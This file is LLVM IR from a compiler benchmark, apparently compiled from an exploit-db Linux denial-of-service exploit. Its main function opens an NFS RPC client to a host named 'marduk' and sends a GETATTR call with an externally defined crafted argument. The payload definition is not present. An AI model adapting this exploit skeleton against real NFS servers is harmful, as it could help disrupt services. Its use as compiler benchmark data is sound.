; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_68.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_68.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_4__ = type { i32 }
%struct.timeval = type { i32, i64 }

@.str = private unnamed_addr constant [7 x i8] c"marduk\00", align 1
@NFSPROG = common dso_local global i32 0, align 4
@NFSVERS = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [4 x i8] c"udp\00", align 1
@.str.2 = private unnamed_addr constant [13 x i8] c"clnt_create\0A\00", align 1
@NFSPROC_GETATTR = common dso_local global i32 0, align 4
@xdr_heh = common dso_local global i64 0, align 8
@heh = common dso_local global i32 0, align 4
@xdr_void = common dso_local global i64 0, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca %struct.TYPE_4__*, align 8
  %3 = alloca %struct.timeval, align 8
  store i32 0, i32* %1, align 4
  %4 = load i32, i32* @NFSPROG, align 4
  %5 = load i32, i32* @NFSVERS, align 4
  %6 = call %struct.TYPE_4__* @clnt_create(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0), i32 %4, i32 %5, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.1, i64 0, i64 0))
  store %struct.TYPE_4__* %6, %struct.TYPE_4__** %2, align 8
  %7 = load %struct.TYPE_4__*, %struct.TYPE_4__** %2, align 8
  %8 = icmp eq %struct.TYPE_4__* %7, null
  br i1 %8, label %9, label %11

9:                                                ; preds = %0
  %10 = call i32 @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.2, i64 0, i64 0))
  br label %11

11:                                               ; preds = %9, %0
  %12 = getelementptr inbounds %struct.timeval, %struct.timeval* %3, i32 0, i32 0
  store i32 3, i32* %12, align 8
  %13 = getelementptr inbounds %struct.timeval, %struct.timeval* %3, i32 0, i32 1
  store i64 0, i64* %13, align 8
  %14 = call i32 (...) @authunix_create_default()
  %15 = load %struct.TYPE_4__*, %struct.TYPE_4__** %2, align 8
  %16 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %15, i32 0, i32 0
  store i32 %14, i32* %16, align 4
  %17 = load %struct.TYPE_4__*, %struct.TYPE_4__** %2, align 8
  %18 = load i32, i32* @NFSPROC_GETATTR, align 4
  %19 = load i64, i64* @xdr_heh, align 8
  %20 = trunc i64 %19 to i32
  %21 = load i64, i64* @xdr_void, align 8
  %22 = trunc i64 %21 to i32
  %23 = call i32 @clnt_call(%struct.TYPE_4__* %17, i32 %18, i32 %20, i8* bitcast (i32* @heh to i8*), i32 %22, i32* null, %struct.timeval* byval(%struct.timeval) align 8 %3)
  ret i32 0
}

declare dso_local %struct.TYPE_4__* @clnt_create(i8*, i32, i32, i8*) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @authunix_create_default(...) #1

declare dso_local i32 @clnt_call(%struct.TYPE_4__*, i32, i32, i8*, i32, i32*, %struct.timeval* byval(%struct.timeval) align 8) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
